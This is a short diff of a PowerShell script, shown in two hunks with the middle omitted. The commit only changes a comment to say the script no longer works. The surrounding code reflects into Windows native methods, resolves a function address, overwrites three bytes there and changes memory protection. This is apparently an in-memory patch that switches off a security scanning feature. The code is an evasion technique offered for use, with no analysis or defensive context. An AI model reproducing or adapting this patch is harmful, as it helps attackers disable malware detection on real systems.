@@ -1,4 +1,4 @@
-# Only works through powershell console
+# Does not work anymore, please try another script
 function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
@@ -29,3 +29,4 @@ $buf = [Byte[]] (0x48, 0x31, 0xDB)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr2, 3)
 
 $vp.Invoke($funcAddr2, 3, 0x20, [ref]$oldProtectionBuffer)
+
